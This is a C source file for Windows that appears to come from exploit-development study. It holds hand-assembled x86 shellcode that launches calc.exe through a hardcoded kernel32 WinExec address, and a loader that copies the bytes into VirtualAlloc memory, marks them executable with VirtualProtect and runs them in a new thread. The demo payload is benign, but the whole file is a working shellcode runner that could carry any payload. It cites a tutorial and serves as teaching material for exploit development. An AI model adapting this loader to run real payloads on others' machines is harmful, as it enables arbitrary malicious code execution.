#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* Reference 
http://www.fuzzysecurity.com/tutorials/expDev/6.html
WinExec = (
"\x33\xc0"                          # XOR EAX,EAX
"\x50"                              # PUSH EAX      => padding for lpCmdLine
"\x68\x2E\x65\x78\x65"              # PUSH ".exe"
"\x68\x63\x61\x6C\x63"              # PUSH "calc"
"\x8B\xC4"                          # MOV EAX,ESP
"\x6A\x01"                          # PUSH 1
"\x50"                              # PUSH EAX
"\xBB\xED\x2A\x86\x7C"              # MOV EBX,kernel32.WinExec
"\xFF\xD3")                         # CALL EBX
*/

unsigned char pay[]{
	0x33, 0xc0,						            // XOR EAX, EAX 
	0x50,				                			// PUSH EAX  
	0x68, 0x2e, 0x65, 0x78, 0x65,   	// PUSH ".exe" 
	0x68, 0x63, 0x61, 0x6c, 0x63,	    // PUSH "calc" 
	0x8b, 0xc4,						            // MOV EAX, ESP 
	0x6a, 0x01,						            // PUSH 1  
	0x50,				                			// PUSH EAX 
	0xbb, 0x30, 0xcd, 0x5d, 0x77,	    // MOV EBX, kernel32.WinExec 775dcd30
	0xff, 0xd3						            // CALL EBX 
};

/*
  // Pop this into main to get the address for WinExec (or any function)
	HMODULE hmod_libname;
	FARPROC fprc_func;
	hmod_libname = LoadLibraryW(L"Kernel32.dll");
	fprc_func = GetProcAddress(hmod_libname, "WinExec");
	// WinExec Address: 775dcd30
*/

int main()
{
	void* execMem;
	BOOL rv;
	HANDLE th;
	DWORD oldprotect = 0;
	unsigned int payL = 25;
	execMem = VirtualAlloc(0, payL, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	RtlMoveMemory(execMem, pay, payL);
	rv = VirtualProtect(execMem, payL, PAGE_EXECUTE_READ, &oldprotect);
	if (rv != 0) {
		th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)execMem, 0, 0, 0);
		WaitForSingleObject(th, -1);
	}
}

 
